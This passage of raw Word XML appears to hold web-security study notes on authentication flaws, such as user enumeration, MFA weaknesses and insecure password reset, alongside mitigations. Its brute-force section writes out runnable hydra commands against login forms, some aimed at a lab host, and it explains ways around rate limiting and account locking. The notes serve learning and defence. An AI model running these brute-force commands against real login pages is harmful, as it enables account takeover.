        <w:t>Review authentication/authorization logic</w:t>
      </w:r>
      <w:r>
        <w:t>: bugs can allow users to access resources they shouldn't be able to.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>Review secondary authentication logic</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:t>new account and password reset flows can be vulnerable to account takeover.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>Prevent user enumeration</w:t>
      </w:r>
      <w:r>
        <w:t>: do not use sequential user IDs, ensure error messages and request processing times are generic, and do not allow account enumeration via API endpoints.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Password based vulnerabilities</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Brute forcing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">Use a tool like </w:t>
      </w:r>
      <w:hyperlink r:id="rId27" w:history="1">
        <w:r>
          <w:rPr>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Hydra</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:hyperlink r:id="rId28" w:history="1">
        <w:r>
          <w:rPr>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Burp Intruder</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> to brute force a login form.  The tool will try a list of common usernames and passwords against the login form submission.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>The following can all be used to perform user enumeration and hone the attack:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Error messages returned (Invalid username vs. Incorr</w:t>
      </w:r>
      <w:r>
        <w:t>ect password)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Response times</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Response status codes</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>This attack can be mitigated by IP based rate limiting, request throttling, account locking, MFA and CAPTCHAs.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t># Brute force an https form POST submission</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t># You can get the $LOGIN_PATH and $FORM_SUBMIT_PAY</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>LOAD using Burp Proxy or your browser's dev tools</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>hydra \</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    -L "$FILE_WITH_USERNAMES" \</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    -P "$FILE_WITH_PASSWORDS" \</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    "$URL_OR_IP" \</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    https-post-form "$LOGIN_PATH:$FORM_SUBMIT_PAYLOAD:$FAILURE_MESSAGE"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t># Username and password list</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>hydra \</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    -</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">L </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>usernames.list</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> \</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    -P </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>passwords.list</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> \</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    web-security-academy.net \</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    https-post-form "/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>login:username</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>=^USER^&amp;password=^PASS^:Invalid username"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t># Known user and password list</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>hydra \</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    -l </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>the_big_cheese</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> \</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    -P </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>passwords.list</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> \</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    web-security</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>-academy.net \</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    https-post-form "/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>login:username</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>=^USER^&amp;password=^PASS^:Invalid username"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t># Known user and password list, checking for a 302 HTTP response code (success condition)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>hydra \</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    -l </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>the_big_cheese</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> \</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    -P </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>passwords.list</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> \</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    web-security</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>-academy.net \</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    https-post-form "/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>login:username</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>=^USER^&amp;password=^PASS^:S=302"</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Considerations</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>Account locking</w:t>
      </w:r>
      <w:r>
        <w:t>: can lead to user enumeration by indicating the account exists.  When an account is locked, the error message should remain generic.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>Credential</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t xml:space="preserve"> stuffing</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: relies on people using the same password across multiple sites.  Uses a dictionary of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>username</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>:password</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> combinations and only tries each </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>username</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> once, thereby bypassing account locking.  This must be caught with rate limiting or throttling.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t xml:space="preserve">IP </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>based rate limiting flaws</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: if a successful login resets the rate limit counter, an attacker can bypass the rate limit by logging in with a valid account every </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> attempts.  Rate limiting should be unconditional for a set period based on the IP address.  Thi</w:t>
      </w:r>
      <w:r>
        <w:t>s can be bypassed by using multiple IP addresses to conduct the attack.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Multi-factor vulnerabilities</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Vulnerabilities can include:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Checking the same factor twice (e.g. email based code) since this is only confirming the user knows their email login (both fa</w:t>
      </w:r>
      <w:r>
        <w:t>ctors are "something you know").</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Using a weak factor (e.g. SMS based code) since this can be intercepted or fall victim to SIM card swapping.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Second factor entry could be brute forced since it is usually a short number.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Once login has succeeded and the sec</w:t>
      </w:r>
      <w:r>
        <w:t>ond factor is requested, if there are flaws in the application logic, it may be possible to:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Bypass the second factor entirely by jumping directly to a page in the application.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>User jump by altering the session cookie to login as a different user.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Other vu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>lnerabilities</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>Insecure password reset</w:t>
      </w:r>
      <w:r>
        <w:t>:  allow an attacker to reset any user's password by guessing the reset link or altering the request to reset a different user's password.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
